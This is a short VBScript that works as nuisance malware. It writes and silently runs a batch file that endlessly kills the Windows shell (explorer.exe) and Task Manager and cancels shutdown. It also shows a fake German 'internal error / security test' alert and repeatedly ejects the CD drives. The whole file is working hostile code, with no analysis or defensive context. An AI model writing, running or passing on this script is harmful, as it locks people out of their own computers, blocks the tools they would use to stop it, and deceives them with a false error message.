Const CHILDBAT = "killer.bat"
Const CHILDVBS = "alertbox.vbs"
Const REPEATER = 100000
Const ForWriting = 2
Const Create = true

Set oWMP = CreateObject("WMPlayer.OCX" )
Set colCDROMs = oWMP.cdromCollection
Set objFSO = Wscript.CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile(CHILDBAT, ForWriting, Create)
Set msgFile = objFSO.OpenTextFile(CHILDVBS, ForWriting, Create)

objFile.WriteLine "@echo off"
objFile.WriteLine ":loop"
objFile.WriteLine "taskkill /F /IM explorer.exe"
objFile.WriteLine "taskkill /F /IM Taskmgr.exe"
objFile.WriteLine "shutdown /a"
objFile.WriteLine "cscript alertbox.vbs"
objFile.WriteLine "goto loop"
objFile.close
msgFile.WriteLine 'MsgBox("Interner Fehler. Sicherheitstest wird gestartet...", vbCritical)'
msgFile.close
Set objFile = nothing
Set msgFile = nothing
Set objFSO = nothing

CreateObject("Wscript.Shell").Run """" & CHILDBAT & """", 0, False

repeat = 10
For x=0 to repeat
If colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
Wscript.Sleep 100
If colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
Next
